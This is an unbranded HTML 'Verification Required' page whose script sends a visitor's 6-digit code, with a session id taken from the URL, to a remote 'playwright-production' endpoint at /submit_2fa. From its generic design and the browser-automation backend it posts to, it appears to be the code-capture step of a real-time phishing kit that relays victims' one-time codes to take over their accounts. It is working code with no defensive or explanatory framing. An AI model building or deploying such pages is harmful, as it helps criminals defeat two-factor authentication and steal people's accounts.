<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Verification Code</title>
  <style>
    /* Your existing styles (no change needed) */
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(145deg, #4a9c8f, #2c7a6b);
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .box {
      background: white;
      padding: 40px 30px;
      border-radius: 20px;
      width: 100%;
      max-width: 380px;
      text-align: center;
      box-shadow: 0 15px 35px rgba(0,0,0,0.15);
    }

    h1 { 
      margin-bottom: 8px; 
      color: #1a1a1a; 
      font-size: 26px;
    }

    p { 
      color: #555; 
      margin-bottom: 30px; 
      font-size: 15px;
    }

    .code-input {
      width: 100%;
      max-width: 280px;
      font-size: 28px;
      text-align: center;
      letter-spacing: 8px;
      padding: 15px 10px;
      border: 2px solid #ddd;
      border-radius: 12px;
      margin-bottom: 25px;
      outline: none;
    }

    .code-input:focus {
      border-color: #7209b7;
    }

    button {
      width: 100%;
      max-width: 280px;
      padding: 16px;
      background: #7209b7;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #5f08a0;
    }

    .status { 
      margin-top: 20px; 
      font-size: 15px; 
      min-height: 24px;
    }
  </style>
</head>
<body>

  <div class="box">
    <h1>Verification Required</h1>
    <p>We've sent a 6-digit code to your recovery email or phone</p>
    
    <input type="text" id="codeInput" class="code-input" maxlength="6" placeholder="123456" autofocus>
    <button onclick="submitCode()">Verify Code</button>
    
    <div class="status" id="status"></div>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');

    if (!sessionId) {
      document.getElementById('status').innerHTML = 
        '<span style="color:red;">Error: Missing session. Please try again from login.</span>';
    }

    async function submitCode() {
      const code = document.getElementById('codeInput').value.trim();
      const statusDiv = document.getElementById('status');
      const button = document.querySelector('button');

      if (code.length !== 6) {
        statusDiv.innerHTML = '<span style="color:red;">Please enter full 6-digit code</span>';
        return;
      }

      button.innerHTML = "Verifying...";
      button.disabled = true;

      try {
        const response = await fetch('https://playwright-production-09d7.up.railway.app/submit_2fa', {   // ← Changed here
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            session_id: sessionId, 
            code: code 
          })
        });

        const result = await response.json();

        if (result.success) {
          statusDiv.innerHTML = '<span style="color:green;"></span>';
          button.innerHTML = "Completed ✓";
        } else {
          statusDiv.innerHTML = `<span style="color:red;">${result.error || "Failed"}</span>`;
          button.disabled = false;
          button.innerHTML = "Verify Code";
        }
      } catch (err) {
        statusDiv.innerHTML = '<span style="color:red;">Cannot connect to server.</span>';
        button.disabled = false;
        button.innerHTML = "Verify Code";
      }
    }

    document.getElementById('codeInput').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') submitCode();
    });
  </script>

</body>
</html>
